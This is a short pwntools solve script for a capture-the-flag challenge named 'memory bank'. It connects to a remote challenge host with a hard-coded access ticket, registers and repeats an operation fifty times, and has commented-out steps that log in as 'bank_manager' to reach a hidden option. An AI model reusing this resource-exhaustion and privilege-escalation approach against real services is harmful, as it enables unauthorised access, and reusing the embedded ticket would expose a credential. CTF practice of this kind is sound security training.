#memory bank
from pwn import *

isremote = False
if isremote:
    
    p = remote("memorybank-tlc4zml47uyjm.shellweplayaga.me", 9005)
    p.recvuntil(b"Ticket please:")
    p.sendline(b"ticket{DaisyPaws2319n25:DvE7tAk4hCSdqd7I6K-CjKKpp7BhEA8SMEr0MDU1wMIKAs17}")
else:
    p = process("./run.sh")

for i in range(50):
    print(p.recvuntil(b"Please register with a username"))
    p.sendline(b"random")
    print(p.recvuntil(b"Choose an operation (1-5):"))
    p.sendline(b"4")

#p.recvuntil(b"Please register with a username")
#p.sendline(b"bank_manager")
#p.recvuntil(b"Choose an operation (1-5):")
#p.sendline(b"6")
p.interactive()
